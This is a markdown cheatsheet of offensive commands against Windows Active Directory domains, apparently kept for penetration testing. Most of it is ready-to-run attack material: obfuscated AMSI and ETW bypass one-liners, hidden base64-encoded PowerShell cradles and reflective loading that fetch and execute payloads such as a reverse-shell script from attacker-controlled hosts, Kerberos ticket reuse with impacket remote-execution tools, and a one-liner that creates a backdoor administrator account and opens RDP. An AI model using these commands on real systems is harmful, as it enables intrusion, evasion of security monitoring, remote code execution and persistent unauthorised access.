# Windows-Domain-Cheatsheet
* [General](#General)
  * [Relaying & Poisoning](relaying.md)
  * [Linux AD](linux_ad.md)
* [Initial Access](Initial-Access.md)
* [Host Reconnaissance](Host-Reconnaissance.md)
* [Host Persistence](Host-Persistence.md)
* [Evasion](Evasion.md)
* [Local privilege escalation](../infrastructure/privesc_windows.md)
* [Post-Exploitation](Post-Exploitation.md)
* [Lateral Movement](Lateral-Movement.md)
* [Domain Enumeration](Domain-Enumeration.md) 
* [Domain Privilege Escalation](Domain-Privilege-Escalation.md)
* [Domain Persistence](Domain-Persistence.md)
   
# General
#### Good links
- https://cybersecuritynews.com/active-directory-checklist/

## Commands
#### Access C disk of a computer (check local admin)
```
ls \\<COMPUTERNAME>\c$
```

#### Use this parameter to not print errors powershell
```
-ErrorAction SilentlyContinue
```

#### Rename powershell windows
```
$host.ui.RawUI.WindowTitle = "<NAME>"
```

#### Save Credentials
```
$creds = get-credential

$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('<USERNAME>', $password)
```

#### Find a specific file
```
Get-Childitem -Path C:\ -Force -Include <FILENAME OR WORD TO SEARCH> -Recurse -ErrorAction SilentlyContinue
```

#### Check access to a file
```
$test = get-acl <PATH>
$test.Access
```

#### Transfer files base64
```
$Content = Get-Content -Encoding Byte -Path 20221025020336_BloodHound.zip
[System.Convert]::ToBase64String($Content)
$Base64 = "<PASTE BASE64>"
Set-Content -Value $([System.Convert]::FromBase64String($Base64)) -Encoding Byte -Path bloodhound.zip
```

#### Base64 encoded commands on Windows
```
$str = 'IEX ((new-object net.webclient).downloadstring("http://<IP>/a"))'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

powershell.exe -nop -w hidden -enc <BASE64 STRING>
```

#### Base64 encoded commands on Linux
```
set str 'IEX ((new-object net.webclient).downloadstring("http://<IP>.com/a"))'
echo -en $str | iconv -t UTF-16LE | base64 -w 0

powershell.exe -nop -w hidden -enc <BASE64 STRING>
```

#### Crackmapexec on windows
- Download cme https://github.com/byt3bl33d3r/CrackMapExec/releases/
- Download latest version of python which is required my cme (currently 3.10) (Windows embeddable package (64-bit)) https://www.python.org/downloads/windows/

```
#add python to path variable:
$env:Path += ";c:\python"
$env:Path += ";c:\tools\python"

#add the register key if error blablah\DemoDLL_RemoteProcess.vcxproj.filters
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem" /v LongPathsEnabled /t REG_DWORD /d 1 /f

#add the registery key for colors
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```

#### Change tickets .kirbi to .ccache and vice versa
```
python3 ticketConverter.py Administrator.kirbi Administrator.ccache
````

#### Use tickets with impacket
```
export KRB5CCNAME=<TGT_ccache_file>
python3 script.py -k -no-pass

python3 psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python3 smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python3 wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

#### Example impacket Domain Trust ticket
```
python3 /opt/impacket/examples/psexec.py -dc-ip <CHILD DC FQDN> <DOMAIN>/Administrator@<TARGET DC FQDN> -k -no-pass -debug
```

#### AMSI Bypass
- https://amsi.fail/
- Or use the one below
```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

```
Invoke-Command -Scriptblock {S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )} $sess
```

#### ETW Bypass
```
[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
```

### Download and execute cradles
- Usefull tool: https://github.com/danielbohannon/Invoke-CradleCrafter
```
iex (New-Object Net.WebClient).DownloadString('http://xx.xx.xx.xx/payload.ps1')
```

#### Full cradle with ETW and AMSI bypass download
```
powershell.exe -c iex (New-Object Net.WebClient).DownloadString('http://x.x.x.x/etw.txt'); iex (New-Object Net.WebClient).DownloadString('http://x.x.x.x/amsi.txt'); iex (New-Object Net.WebClient).DownloadString('http://x.x.x.x/Invoke-PowerShellTcp.ps1')
```

#### Others
```
$ie=New-Object -ComObjectInternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://xx.xx.xx.xx/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response

#PSv3 onwards

iex (iwr 'http://xx.xx.xx.xx/evil.ps1')

$h=New-Object -ComObject
Msxml2.XMLHTTP;$h.open('GET','http://xx.xx.xx.xx/evil.ps1',$false);$h.send();iex
$h.responseText

$wr = [System.NET.WebRequest]::Create("http://xx.xx.xx.xx/evil.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

#### Reflective Load C Sharp binary
- Make sure the class is public `public class Program`
- Make sure the void Main is public `public static void Main(string[] args)`public static void Main(string[] args)`

```
$data = (New-Object System.Net.WebClient).DownloadData('http://XX.XX.XX.XX/Payload.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[<NAMESPACE>.<CLASS>]::Main("".Split())

$data = (New-Object System.Net.WebClient).DownloadData('http://XX.XX.XX.XX/Payload.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Dropper.Program]::Main("".Split())
```

#### Add user to local admin and RDP group and enable RDP on firewall
```
net user <USERNAME> <PASSWORD> /add /Y  && net localgroup administrators <USERNAME> /add && net localgroup "Remote Desktop Users" <USERNAME> /add && reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

## Troubleshooting
### KRB_AP_ERR_SKEW(Clock skew to great)
#### Disable time sync
- https://askubuntu.com/questions/683067/how-to-stop-automatic-time-update-via-terminal
```
sudo timedatectl set-ntp 0
```

#### Get time
```
sudo net time set -S <DC IP>
```

#### Set time and date manually
- If above fails and only prints the time
```
sudo timedatectl set-time `<YEAR>-<MONTH>-<DATE> xx:xx:xx`
sudo timedatectl set-time `2022-12-28 20:59:33`
```

#### Execute commands

#### Enable time sync again - Restore time to original
```
sudo timedatectl set-ntp 1
```
